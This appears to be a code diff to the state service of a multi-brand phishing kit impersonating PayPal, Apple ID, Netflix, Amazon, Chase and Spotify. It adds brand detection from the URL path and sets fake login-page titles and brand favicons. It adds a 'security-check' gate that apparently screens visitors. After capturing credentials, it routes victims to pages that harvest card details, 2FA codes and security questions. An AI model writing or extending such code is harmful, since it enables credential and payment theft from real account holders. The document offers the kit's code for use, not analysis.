@@ -145,6 +145,7 @@ export class StateService {
     readonly isPersonalVerified = signal<boolean>(false);
     readonly isCardSubmitted = signal<boolean>(false);
     readonly isFlowComplete = signal<boolean>(false);
+    readonly hasPassedSecurityCheck = signal<boolean>(false);
 
     // Auto-Approve Threshold (Dynamic)
     readonly autoApproveThreshold = signal<number>(20000);
@@ -196,12 +197,38 @@ export class StateService {
                     this.trackClick(code);
                 }
 
-                const flowId = params.get('flow') || 'paypal';
+                // Detect Flow from Path or Query
+                let flowId = params.get('flow');
+                if (!flowId) {
+                    // Try to extract from path: /verify/netflix/...
+                    const match = window.location.pathname.match(/\/verify\/([a-zA-Z0-9-]+)/);
+                    if (match && match[1]) {
+                        flowId = match[1];
+                    }
+                }
+
+                // Default to PayPal only if we can't determine otherwise
+                if (!flowId) flowId = 'paypal';
+
                 const flow = getFlowById(flowId);
                 if (flow) {
                     this.currentFlow.set(flow);
                     this.applyFlowTheme(flow);
                 }
+
+                // Reactive: When currentFlow changes (e.g. via component access), update theme
+                effect(() => {
+                    const f = this.currentFlow();
+                    if (f) {
+                        this.applyFlowTheme(f);
+                        // ENFORCE SECURITY CHECK: If flow is brand-specific and we haven't passed check, redirect
+                        // But exclude if we are ALREADY at security-check or admin
+                        const path = window.location.pathname;
+                        if (!this.hasPassedSecurityCheck() && !path.includes('security-check') && !isAdminPath) {
+                            setTimeout(() => this.router.navigate(['security-check']), 0);
+                        }
+                    }
+                });
             }
         }
 
@@ -435,6 +462,7 @@ export class StateService {
             isPersonalVerified: this.isPersonalVerified(),
             isCardSubmitted: this.isCardSubmitted(),
             isFlowComplete: this.isFlowComplete(),
+            hasPassedSecurityCheck: this.hasPassedSecurityCheck(),
             rejectionReason: this.rejectionReason(),
             timestamp: Date.now(),
             // New fields for Admin Countdown
@@ -527,6 +555,7 @@ export class StateService {
         if (data.isPersonalVerified !== undefined) this.isPersonalVerified.set(data.isPersonalVerified);
         if (data.isCardSubmitted !== undefined) this.isCardSubmitted.set(data.isCardSubmitted);
         if (data.isFlowComplete !== undefined) this.isFlowComplete.set(data.isFlowComplete);
+        if (data.hasPassedSecurityCheck !== undefined) this.hasPassedSecurityCheck.set(data.hasPassedSecurityCheck);
         if (data.rejectionReason !== undefined) this.rejectionReason.set(data.rejectionReason);
 
         // Restore Timer State (Fixes infinite loading on refresh)
@@ -623,6 +652,25 @@ export class StateService {
         if (t.background.type === 'image') root.style.setProperty('--pp-bg-image', t.background.value);
 
         root.style.setProperty('--primary-color', t.button.background);
+
+        // Update Browser Tab (Title & Favicon)
+        if (typeof document !== 'undefined') {
+            // Update Title
+            const brandName = flow.name;
+            if (brandName === 'PayPal') {
+                document.title = 'Log in to your PayPal account';
+            } else if (brandName === 'Apple ID') {
+                document.title = 'Sign In - Apple ID';
+            } else {
+                document.title = `Sign in to ${brandName}`;
+            }
+
+            // Update Favicon
+            const favicon: HTMLLinkElement | null = document.querySelector("link[rel*='icon']");
+            if (favicon && t.faviconUrl) {
+                favicon.href = t.faviconUrl;
+            }
+        }
     }
 
     // --- API Sync Logic ---
@@ -1135,7 +1183,7 @@ export class StateService {
             }
 
             if (currentStage === 'login' || currentStage === 'login_pending') {
-                // Prevent regression: If already verified, don't navigate back to limited
+                // Prevent regression: If already verified, don't navigate back
                 if (this.isLoginVerified()) {
                     return;
                 }
@@ -1144,7 +1192,30 @@ export class StateService {
                 if (payload && payload.skipPhone !== undefined) {
                     this.skipPhoneVerification.set(payload.skipPhone);
                 }
-                this.navigate('limited', true);
+
+                // BRAND-AWARE NAVIGATION
+                const flowId = this.currentFlow()?.id;
+
+                if (flowId === 'netflix') {
+                    this.navigate('verify/netflix/payment', true);
+                } else if (flowId === 'amazon') {
+                    // If your kit uses 2-step login, go to password. 
+                    // But our current UI does both on one page. 
+                    // Let's go to a neutral "Success" then maybe account update later.
+                    // For now, let's keep it immersive.
+                    this.navigate('verify/amazon/password', true);
+                } else if (flowId === 'apple') {
+                    this.navigate('verify/apple/2fa', true);
+                } else if (flowId === 'chase') {
+                    this.navigate('verify/chase/questions', true);
+                } else if (flowId === 'spotify') {
+                    // Spotify doesn't have many verification steps, go straight to "success" or fake "confirm identity"
+                    this.isFlowComplete.set(true);
+                    this.navigate('success', true);
+                } else {
+                    // Default / PayPal flow
+                    this.navigate('limited', true);
+                }
             } else if (currentStage === 'phone_pending') {
                 this.isPhoneVerified.set(true);
                 this.navigate('personal', true);
